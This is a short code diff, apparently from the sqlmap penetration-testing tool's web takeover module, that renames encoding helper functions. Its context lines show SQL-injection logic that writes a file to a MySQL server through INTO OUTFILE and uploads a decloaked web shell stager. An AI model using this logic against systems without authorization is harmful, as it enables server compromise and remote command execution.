@@ -32,8 +32,8 @@ from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.common import singleTimeWarnMessage
 from lib.core.compat import xrange
-from lib.core.convert import hexencode
-from lib.core.convert import utf8encode
+from lib.core.convert import encodeHex
+from lib.core.convert import getBytes
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -152,7 +152,7 @@ class Web:
                 randInt = randomInt()
                 query += "OR %d=%d " % (randInt, randInt)
 
-        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery, conf.encoding))
+        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=encodeHex(uplQuery, binary=False))
         query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
         payload = agent.payload(newValue=query)
         page = Request.queryPage(payload)
@@ -332,7 +332,7 @@ class Web:
 
                     with open(filename, "w+b") as f:
                         _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform))
-                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
+                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, getBytes(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
                         f.write(_)
 
                     self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
